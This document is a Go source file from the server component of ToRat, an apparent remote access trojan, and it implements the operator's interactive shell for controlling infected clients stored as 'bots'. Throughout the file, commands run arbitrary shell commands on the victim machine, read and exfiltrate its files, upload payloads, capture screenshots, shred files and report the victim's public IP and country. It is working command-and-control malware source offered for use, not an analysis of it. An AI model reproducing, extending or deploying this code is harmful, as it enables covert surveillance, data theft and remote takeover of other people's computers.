package server

import (
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/lu4p/ToRat/shared"
	"github.com/lu4p/shred"
)

// Client side interactive shell menu
func (client activeClient) shellClient() {
	fileCompleter := func([]string) []string {
		return client.Dir.Files
	}

	// Set shell and get working dir
	shell := ishell.New()
	r := shared.Dir{}
	err := client.RPC.Call("API.LS", void, &r)
	if err != nil {
		// TODO: This may cause false positive on edges cases
		client.Dir.Path = "DISCONNECTED"
	}
	client.Dir = r

	shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")

	commands := []*ishell.Cmd{
		{
			Name: "cd",
			Func: func(c *ishell.Context) {
				client.Cd(c)
				shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")
			},
			Completer: fileCompleter,
			Help:      "change the working directory of the client",
		},
		{
			Name: "ls",
			Func: client.ls,
			Help: "list the files in a directory",
		},
		{
			Name:      "cat",
			Func:      client.Cat,
			Help:      "print the content of a file: usage cat <file>",
			Completer: fileCompleter,
		},
		{
			Name:      "down",
			Func:      client.Download,
			Help:      "download a file from the client: usage down <file>",
			Completer: fileCompleter,
		},
		{
			Name: "up",
			Func: client.Upload,
			Help: "upload a file from the cwd of the Server to cwd of the client: usage up <file>",
		},
		{
			Name: "screen",
			Func: client.Screen,
			Help: "take a screenshot of the client and upload it to the server",
		},
		{
			Name: "escape",
			Func: client.runCommand,
			Help: "escape a command and run it natively on client",
		},
		{
			Name: "reconnect",
			Func: func(c *ishell.Context) {
				client.Reconnect(c)
				shell.Close()
			},
			Help: "tell the client to reconnect",
		},
		{
			Name: "speedtest",
			Func: client.Speedtest,
			Help: "run a speedtest on a clients native internet connection (non-tor)",
		},
		{
			Name: "exit",
			Func: func(c *ishell.Context) {
				c.Stop()
				shell.Close()
			},
			Help: "background the current session",
		},
	}

	for _, c := range commands {
		shell.AddCmd(c)
	}

	shell.NotFound(client.runCommand)
	shell.Run()
}

// ls remote directory
func (client *activeClient) ls(c *ishell.Context) {
	r := shared.Dir{}
	err := client.RPC.Call("API.LS", void, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Encoutered error during list!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
		return
	}
	client.Dir = r
	for _, f := range client.Dir.Files {
		c.Println(f)
	}
}

// cat remote file
func (client *activeClient) Cat(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	var r string
	err := client.RPC.Call("API.Cat", path, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not cat file!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
	}
	c.Println(r)
}

// Change remote directory
func (client *activeClient) Cd(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	r := shared.Dir{}
	err := client.RPC.Call("API.Cd", path, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not change to that path!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
	}
	client.Dir = r
}

// Download a remote file
func (client *activeClient) Download(c *ishell.Context) {
	var r shared.File
	arg := strings.Join(c.Args, " ")

	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	err := client.RPC.Call("API.SendFile", arg, &r)
	if err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Download could not be sent to Server!"))
		c.ProgressBar().Stop()
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
		return
	}

	dlPath := filepath.Join("/ToRat/cmd/server/bots/", client.Client.Hostname, r.Fpath)
	dlDir, _ := filepath.Split(dlPath)

	if err := os.MkdirAll(dlDir, os.ModePerm); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Could not create directory path!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}

	if err := ioutil.WriteFile(dlPath, r.Content, 0600); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}

	c.ProgressBar().Final(green("[Server] ") + green("[+] Download received"))
	c.ProgressBar().Stop()
}

// Upload a file from server to client
func (client *activeClient) Upload(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	info, _ := os.Stat(path)

	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	content, err := ioutil.ReadFile(path)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed could not read local file!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}

	f := shared.File{
		Content: content,
		Path:    path,
		Perm:    info.Mode(),
	}

	if err := client.RPC.Call("API.RecvFile", f, &void); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}

	c.ProgressBar().Final(green("[Server] ") + green("[+] Upload Successful"))
	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Upload successfully received"))
	c.ProgressBar().Stop()
}

// Capture remote screenshot
func (client *activeClient) Screen(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	filename := getTimeSt() + ".png"
	var r []byte

	if err := client.RPC.Call("API.Screen", void, &r); err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Screenshot failed!"))
		c.ProgressBar().Stop()
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
		return
	}
	err := ioutil.WriteFile(filepath.Join(client.Client.Path, filename), r, 0600)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Screenshot could not be saved"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}
	c.ProgressBar().Final(green("[Server] ") + green("[+] Screenshot received"))
	c.ProgressBar().Stop()
}

// Force client reconnect
// TODO: I don't think this feature works
func (client *activeClient) Reconnect(c *ishell.Context) {
	var r bool
	client.RPC.Call("API.Reconnect", void, &r)
	c.Stop()
}

// Remove remote file
// TODO: Is this used? Where?
func (client *activeClient) Shred(c *ishell.Context) {
	args := shared.Shred{
		Conf: shred.Conf{
			Times:  3,
			Zeros:  true,
			Remove: true,
		},
		Path: strings.Join(c.Args, " "),
	}
	var r error
	if err := client.RPC.Call("API.Shred", &args, &r); err != nil {
		c.Println(red("[!] Could not shred path:", args.Path, err, r))
	}
}

// Speedtest the clients internet connection
func (client *activeClient) Speedtest(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	r := shared.Speedtest{}
	if err := client.RPC.Call("API.Speedtest", void, &r); err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not perform speedtest on client!"))
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
		return
	}

	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Speedtest finished"))
	c.ProgressBar().Stop()

	c.Println(green("Public IP: "), r.IP)
	c.Println(green("Country:   "), r.Country)
	c.Println(green("Ping:      "), r.Ping)
	c.Println(green("Download:  "), r.Download)
	c.Println(green("Upload:    "), r.Upload)
}

// Run a command on client
func (client *activeClient) runCommand(c *ishell.Context) {
	command := strings.Join(c.Args, " ")
	var r string
	args := shared.Cmd{
		Cmd:        command,
		Powershell: false,
	}

	err := client.RPC.Call("API.RunCmd", args, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Bad or unkown command!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
	}

	c.Println(r)
}
